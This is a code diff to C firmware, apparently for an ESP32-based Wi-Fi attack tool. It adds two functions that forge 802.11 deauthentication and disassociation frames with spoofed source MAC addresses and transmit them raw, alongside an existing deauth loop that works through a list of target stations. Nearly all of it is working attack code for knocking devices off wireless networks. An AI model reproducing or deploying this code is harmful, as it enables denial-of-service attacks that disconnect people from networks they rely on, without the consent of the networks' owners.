@@ -5,6 +5,7 @@
 #include "common.h"
 #include "deauth.h"
 #include "esp_err.h"
+#include "esp_interface.h"
 #include "esp_wifi.h"
 #include "esp_wifi_types.h"
 #include <freertos/FreeRTOS.h>
@@ -32,6 +33,26 @@ static TaskHandle_t deauthTask = NULL;
 
 ScanResultSTA **targetSTA = NULL;
 int targetCount = 0;
+
+esp_err_t deauth_standalone_packet(uint8_t *src, uint8_t *dest) {
+    uint8_t pkt[26];
+    memcpy(pkt, deauth_pkt, 26);
+    memcpy(&pkt[4], dest, 6);
+    memcpy(&pkt[10], src, 6);
+    memcpy(&pkt[16], src, 6);
+    return esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), true);
+}
+
+esp_err_t disassoc_standalone_packet(uint8_t *src, uint8_t *dest) {
+    uint8_t pkt[26];
+    memcpy(pkt, deauth_pkt, 26);
+    /* Make it a disassociation packet rather than deauthentication */
+    memset(pkt, 0xa0, 1);
+    memcpy(&pkt[4], dest, 6);
+    memcpy(&pkt[10], src, 6);
+    memcpy(&pkt[16], src, 6);
+    return esp_wifi_80211_tx(ESP_IF_WIFI_AP, pkt, sizeof(pkt), true);
+}
 
 void deauthLoop(void *pvParameter) {
     /* Set deauth_delay appropriately if it's silly */
